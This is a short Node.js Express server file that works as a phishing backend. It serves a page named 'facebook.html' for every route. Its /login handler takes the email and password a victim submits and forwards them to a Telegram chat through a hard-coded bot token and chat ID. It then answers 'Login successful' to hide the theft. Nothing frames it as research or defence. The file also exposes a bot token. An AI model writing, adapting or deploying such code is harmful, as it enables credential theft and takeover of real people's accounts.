const express = require("express");
const bodyParser = require("body-parser");
const path = require("path");
const TelegramBot = require("node-telegram-bot-api");

const app = express();
const port = 3000;

// Telegram bot token
const botToken = "6159399430:AAF8Dhzaw1TpGPtwAaydzmFEYKYVqdycDXk";
const chatId = "6180447283";

// Create a new instance of the Telegram bot
const bot = new TelegramBot(botToken, { polling: false });

// Parse incoming request bodies
app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());

// Serve static files
app.use(express.static(__dirname));

// Handle login request
app.post("/login", (req, res) => {
  const email = req.body.email;
  const password = req.body.password;

  // Send the login credentials to the Telegram bot
  const message = `Received login credentials:\nUsername: ${email}\nPassword: ${password}`;
  bot.sendMessage(chatId, message);

  res.send("Login successful"); // Send response to the client
});

// Wildcard route to serve login.html for any requested route
app.get("*", (req, res) => {
  res.sendFile(path.join(__dirname, "facebook.html"));
});

// Start the server
app.listen(port, () => {
  console.log(`Server is running on http://localhost:${port}`);
});